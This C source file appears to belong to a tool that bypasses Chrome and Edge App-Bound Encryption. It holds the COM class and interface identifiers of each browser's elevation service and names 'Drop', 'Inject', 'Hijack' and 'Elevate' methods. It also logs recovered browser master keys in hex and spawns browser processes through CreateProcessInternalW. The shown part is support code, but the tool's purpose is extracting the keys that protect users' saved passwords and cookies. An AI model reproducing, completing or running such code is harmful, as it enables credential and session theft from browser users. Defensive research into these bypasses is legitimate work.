#include "AbeDecrypt.h"

/*** browsers & methods ***/

/* ABE private data, indexed by NET_BROWSER_TYPE */
const ABE_BROWSER AbeBrowsers[NetBrowserMax] = {
    /* Edge */
    { L"Microsoft Edgekey1",
      {0x1FCBE96C,0x1697,0x43AF,{0x91,0x40,0x28,0x97,0xC7,0xC6,0x97,0x67}},
      {0xC9C2B807,0x7731,0x4F34,{0x81,0xB7,0x44,0xFF,0x77,0x79,0x52,0x2B}}, 8 },
    /* Chrome */
    { L"Google Chromekey1",
      {0x708860E0,0xF641,0x4611,{0x88,0x95,0x7D,0x86,0x7D,0xD3,0x67,0x5B}},
      {0x1BF5208B,0x295F,0x4992,{0xB5,0xF4,0x3A,0x9B,0xB6,0x49,0x48,0x38}}, 5 },
};

const PCWSTR AbeMethodNames[MethodMax] = { L"Drop", L"Inject", L"Hijack", L"Elevate" };

/*** log ***/

WCHAR g_Log[4096];

VOID
AbeLog(
    _In_z_ _Printf_format_string_ PCWSTR Format,
    ...)
{
    va_list Args;
    ULONG Length;

    va_start(Args, Format);
    Length = (ULONG)wcslen(g_Log);
    if (Length < ARRAYSIZE(g_Log) - 1)
    {
        Str_VPrintfExW(g_Log + Length, ARRAYSIZE(g_Log) - Length, Format, Args);
    }
    va_end(Args);
}

VOID
AbeFormatKeyHex(
    _In_reads_bytes_(ABE_KEY_SIZE) const BYTE* Key,
    _Out_writes_(ABE_KEY_SIZE * 2 + 1) PSTR Text)
{
    ULONG i;

    for (i = 0; i < ABE_KEY_SIZE; i++)
    {
        Str_PrintfExA(Text + i * 2, 3, "%02X", Key[i]);
    }
}

VOID
AbeLogKey(
    _In_z_ PCWSTR Name,
    _In_reads_bytes_(ABE_KEY_SIZE) const BYTE* Key)
{
    CHAR Hex[ABE_KEY_SIZE * 2 + 1];

    AbeFormatKeyHex(Key, Hex);
    AbeLog(L"!!! %ls KEY: %hs !!!\r\n", Name, Hex);
}

/*** helpers ***/

BOOL
AbeCreateBrowserProcess(
    _In_z_ PCWSTR ExePath,
    _In_ DWORD CreationFlags,
    _Out_ LPPROCESS_INFORMATION ProcessInformation)
{
    STARTUPINFOW Si;

    RtlZeroMemory(&Si, sizeof(Si));
    Si.cb = sizeof(Si);
    return CreateProcessInternalW(NULL,
                                  ExePath,
                                  NULL,
                                  NULL,
                                  NULL,
                                  FALSE,
                                  CreationFlags,
                                  NULL,
                                  NULL,
                                  &Si,
                                  ProcessInformation,
                                  NULL);
}
